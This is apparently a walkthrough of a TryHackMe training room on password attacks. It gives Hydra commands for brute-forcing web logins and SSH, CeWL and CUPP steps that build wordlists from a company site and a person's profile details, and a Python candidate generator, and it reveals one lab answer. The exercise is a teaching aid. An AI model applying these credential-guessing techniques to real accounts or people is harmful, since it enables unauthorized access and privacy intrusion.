# Checkmate

Room: https://tryhackme.com/room/checkmate

Exploit weak password practices across Marco’s internal systems to achieve full compromise.

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/jr-penetration-tester/Checkmate.md

---

The attack path was:

1. Find default FirewallOS credentials
2. Use a company keyword to log into the Jobs panel
3. Use Marco profile details to generate a custom wordlist
4. Reverse the uploaded profile picture filename hash
5. Use Marco password pattern to brute force SSH

---

## 1. FirewallOS Default Credentials

The first clue said Marco deployed a firewall at:

```text
firewall.thm:5001
```

The login page was available at:

```text
http://10.67.145.255:5001/login
```

The form used these fields:

```text
username
password
```

A failed login returned:

```text
Invalid credentials.
```

We tested common default credentials with Hydra.

```bash
hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Default-Credentials/default-passwords.txt 10.67.145.255 -s 5001 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials."
```

This worked and found the valid login.

Valid login found:

```text
admin:[REDACTED]
```

The password was a very common numeric default.

---

## 2. Jobs Panel Company Keyword Password

The next clue said Marco built an internal Employee Login panel at:

```text
jobs.thm:5002
```

The page was available at:

```text
http://10.67.145.255:5002/
```

The clue said common company keywords were used as passwords.

We used CeWL to collect words from the page.

```bash
cewl http://10.67.145.255:5002/ -w jobs_words.txt
```

We knew the password was 10 characters long, so we filtered the wordlist to exactly 10 characters.

```bash
grep -x '.\{10\}' jobs_words.txt
```

There were only a small number of candidates, so we tested them manually.

Valid login found:

```text
admin:[REDACTED]
```

The password was the 10 character company keyword.

Lesson learned: CeWL is useful when the password is based on visible page content.

---

## 3. Social Profile Password From Personal Info

The next clue pointed to:

```text
social.thm:5003
```

The profile showed Marco's employee details.

Important details found:

```text
First name: Marco
Surname: Bianchi
Nickname: marky
Birthdate: 14021995
Role: IT Operations
```

The clue said Marco's password was derived from personal information, so we used CUPP.

```bash
cupp -i
```

CUPP asks for personal details. We entered:

```text
First name: Marco
Surname: Bianchi
Nickname: marky
Birthdate: 14021995
```

CUPP generated a custom wordlist.

The login form returned:

```text
Invalid credentials.
```

We tested the generated list with Hydra.

```bash
hydra -l marco -P marco.txt 10.67.145.255 -s 5003 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials."
```

Valid login found:

```text
marco:[REDACTED]
```

The password was a CUPP style mutation based on Marco's surname and birthdate.

Lesson learned: Personal profile pages can leak enough information to build strong targeted wordlists.

---

## 4. Profile Picture Filename Hash

After logging into the social panel, the next task said Marco recently uploaded a new profile picture.

The platform renamed uploaded files like this:

```text
SHA256 original filename .png
```

The stored image filename was:

```text
d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png
```

This meant the hash was not the image file hash. It was the SHA256 hash of the original filename string.

We also checked the hash with Hashes.com:

```text
https://hashes.com/en/decrypt/hash
```

Submitting the hash there returned the plaintext value

---

## 5. SSH Password Pattern

Marco revealed his password pattern on the social page:

```text
Take a company keyword
Capitalize it
Append a year or number
Add an exclamation mark
```

We also knew the SSH password was 13 characters long.

The pattern was:

```text
Keyword + 4 digits + !
```

That means the keyword had to be 8 characters long.

```text
8 letters + 4 digits + ! = 13 characters
```

Useful 8 character keywords included:

```text
Security
Employee
Firewall
Internal
Platform
```

We used CeWL to collect company keywords from the Jobs page.

```bash
cewl http://10.65.148.1:5002/ -w social_words.txt
```

We then built a targeted wordlist with Python. The password had to be 13 characters long, so the script only kept 8 letter keywords from the CeWL output and generated this pattern:

```text
CapitalizedKeyword + 4 digits + !
```

```python
words = set()

with open("social_words.txt", "r", errors="ignore") as f:
    for line in f:
        word = line.strip()
        if word.isalpha() and len(word) == 8:
            words.add(word.lower())

numbers = [
    "2024",
    "2025",
    "2026",
    "1995",
    "2495",
    "1402",
    "0214",
    "1234",
]

candidates = []

for word in sorted(words):
    capitalized = word[:1].upper() + word[1:].lower()
    uppercase = word.upper()

    for variant in [capitalized, uppercase]:
        for number in numbers:
            password = f"{variant}{number}!"
            if len(password) == 13:
                candidates.append(password)

with open("marco_ssh_pass.txt", "w") as f:
    f.write("\n".join(sorted(set(candidates))) + "\n")

print(f"Generated {len(set(candidates))} passwords")
```

Example candidates:

```text
Employee2024!
Firewall2024!
Internal2024!
Platform2024!
```

Then we tested SSH using username `marco`.

```bash
hydra -l marco -P marco_ssh_pass.txt ssh://10.67.145.255 -t 4 -V
```

Hydra found the SSH login:

```text
marco:[REDACTED]
```

Lesson learned: A strong-looking password can still be weak if the pattern is predictable.

---

## Summary

Credentials and answers found during the chain:

```text
FirewallOS login
admin:[REDACTED]

Jobs login
admin:[REDACTED]

Social login
marco:[REDACTED]

Profile picture original filename
family

SSH login
marco:[REDACTED]
```

Key tools used:

```text
Hydra
CeWL
CUPP
sha256sum
```

Main takeaway:

This challenge demonstrates how weak password habits build on each other. Defaults, company keywords, personal details, reused patterns, and predictable formatting all make targeted password attacks much easier.
